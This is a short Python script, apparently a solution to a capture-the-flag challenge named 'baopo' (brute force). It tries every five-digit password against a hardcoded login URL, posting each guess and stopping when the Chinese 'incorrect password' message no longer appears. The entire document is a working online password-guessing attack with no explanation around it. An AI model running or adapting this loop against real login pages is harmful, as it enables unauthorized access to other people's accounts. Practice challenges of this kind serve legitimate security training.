#-*-coding:utf-8-*-
import requests

url='http://123.206.87.240:8002/baopo/?yes'
false_state="密码不正确"
ss = requests.session()
pwd=10000
while pwd < 100000:
    payload={'pwd':pwd}
    post = ss.post(url,payload)
    content = post.content.decode('utf-8')
    if false_state not in content:
        print("pwd:"+str(pwd))
        break
    pwd = pwd + 1